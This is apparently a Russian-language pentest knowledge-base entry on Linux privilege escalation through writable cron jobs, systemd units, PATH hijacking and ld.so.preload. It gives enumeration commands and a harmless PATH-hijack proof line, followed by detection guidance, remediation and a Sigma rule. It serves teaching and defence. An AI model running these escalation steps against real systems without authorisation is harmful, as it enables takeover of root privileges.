---
id: linux-writable-cron-or-path
title: "Linux: записываемые cron-задачи, systemd-юниты и PATH-подмена"
type: privesc
target: linux
category: web
difficulty: intermediate
bypass: none
tags: [privesc, linux, cron, systemd, path-hijack, persistence]
tested_on: ["Debian 12", "Ubuntu 22.04"]
success_rate: 0.65
risk: high
cwe: "CWE-427"
lab: null
last_verified: "2026-10-23"
references:
  - "https://book.hacktricks.xyz/privilege-escalation/privilege-escalation"
  - "https://lolbas-project.github.io/"
---

# Linux: записываемые cron-задачи, systemd-юниты и PATH-подмена

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
# 1) cron: что выполняется от root и доступно на запись
cat /etc/crontab; ls -la /etc/cron.* /var/spool/cron/ 2>/dev/null
# поиск скриптов/каталогов cron, доступных на запись
for f in $(grep -rhoE '/[^ ]+\.(sh|py|pl|rb)' /etc/cron* /var/spool/cron 2>/dev/null | sort -u); do
  [ -w "$f" ] && echo "WRITABLE SCRIPT: $f"; done
# и каталогов, в которых они лежат (подмена файла)
for f in $(grep -rhoE '/[^ ]+\.(sh|py|pl|rb)' /etc/cron* 2>/dev/null | sort -u); do
  d=$(dirname "$f"); [ -w "$d" ] && echo "WRITABLE DIR: $d"; done

# 2) PATH-подмена: cron/systemd вызывают программу по относительному имени
#    пример: в скрипте от root есть строка `backup.sh` или `service nginx reload`
echo 'id > /tmp/HB-PRIVESC-PROOF' > /tmp/backup.sh && chmod +x /tmp/backup.sh
#    если в задаче вызывается просто `backup.sh` и PATH содержит /tmp — сработает

# 3) systemd-юниты и drop-in, доступные на запись
systemctl list-unit-files --type=service --state=enabled | head -40
find /etc/systemd/system /usr/lib/systemd/system -writable -type f 2>/dev/null
# таймеры (cron-аналог в systemd)
systemctl list-timers --all

# 4) ld.so.preload и записываемые библиотеки
ls -la /etc/ld.so.preload 2>/dev/null; ldd /usr/bin/sudo
find / -writable -name '*.so*' -type f 2>/dev/null | grep -v proc | head -20
```

## Explanation

Три родственных механизма дают эскалацию через **подмену исполняемого
кода**:

1. **cron/systemd-timers**: задача выполняется от root по расписанию.
    Уязвимость — если сам скрипт или его каталог доступен на запись
    непривилегированному пользователю, либо скрипт вызывает программу
    по относительному имени.
2. **PATH-перехват**: если в окружении задачи `PATH` содержит каталог,
    куда есть запись (`/tmp`, домашний каталог, `.`), а команда указана
    без полного пути, система выполнит ваш файл. Часто встречается
    вместе с `PATH=/usr/local/sbin:...:/tmp` в кастомных скриптах.
3. **systemd-юниты и drop-in**: записываемый `.service`/`.timer` или
    каталог `*.service.d/` позволяет добавить `ExecStartPre=` с вашей
    командой; после `systemctl daemon-reload` она выполнится от root
    при следующем запуске сервиса.

Родственный класс — **динамические библиотеки**: записываемый `/etc/ld.so.preload`
или `.so` в пути поиска библиотеки привилегированного бинарника.

Порядок проверки: найти все задачи root (cron + timers), извлечь вызываемые
пути, проверить права на файл и на все родительские каталоги (запись в
каталог = подмена файла), затем проверить относительные вызовы и `PATH`.

## Detection

* Контроль прав: baseline-проверка, что `/etc/cron*`, `/var/spool/cron`,
  `/etc/systemd/system` и `/usr/lib/systemd/system` недоступны на запись
  никому, кроме root (find -writable).
* Аудит изменений: `auditd` на `write`/`rename`/`unlink` в этих каталогах.
* Анализ содержимого задач: вызовы без полного пути, обращения к `/tmp`,
  `PATH` с записываемыми каталогами.
* Алерт на новый cron-файл или systemd-юнит от непривилегированного
  пользователя.
* Мониторинг `ld.so.preload`: файл должен быть root-only и, как правило,
  пуст.
* Детект выполнения: процесс root, порождённый cron/systemd, чей
  исполняемый файл лежит в `/tmp`, `/dev/shm` или домашнем каталоге.

## Remediation

- Все вызываемые программы — полными путями; в скриптах явно задавать
  `PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`.
- Права: скрипты root-owned `0755`, каталоги — без записи для группы
  и прочих (`0755` и выше по необходимости).
- Не хранить рабочие данные и скрипты в `/tmp`; для временных файлов —
  `mktemp -d` и режим `0700`.
- systemd: `ProtectSystem=strict`, `ProtectHome=true`, `PrivateTmp=true`,
  `NoNewPrivileges=true` в юнитах; drop-in-каталоги только root.
- Ревью cron-задач при каждом изменении (инфраструктура-как-код):
  задачи описаны в репозитории, правки проходят code review.
- `umask 022`+ и запрет групповой записи в системных каталогах.
- Мониторинг целостности (`aide`) на системные каталоги задач.


## Detection rules

```yaml
title: Исполняемый файл задачи root находится в пользовательском каталоге
id: c3d4e5f6-0003-4c3d-9e4f-000000000203
status: experimental
description: >-
  Процесс с euid=0, запущенный планировщиком (cron/systemd), исполняет бинарник
  или скрипт из /tmp, /dev/shm или домашнего каталога — признак подмены кода задачи.
references:
  - https://attack.mitre.org/techniques/T1053/003/
  - https://attack.mitre.org/techniques/T1574/007/
logsource:
  product: linux
  service: auditd
  definition: 'аудит execve; Sysmon for Linux EventID 1'
detection:
  selection:
    EventType: EXECVE
    euid: 0
    ParentImage|contains:
      - '/usr/sbin/cron'
      - '/usr/sbin/crond'
      - '/lib/systemd/systemd'
    Image|startswith:
      - '/tmp/'
      - '/var/tmp/'
      - '/dev/shm/'
      - '/home/'
  condition: selection
fields:
  - Image
  - CommandLine
  - ParentImage
  - User
falsepositives:
  - легитимные задачи, использующие /tmp для работы (переписать на mktemp и полный путь)
level: high
tags:
  - attack.persistence
  - attack.privilege_escalation
  - attack.t1053.003
  - attack.t1574.007
```
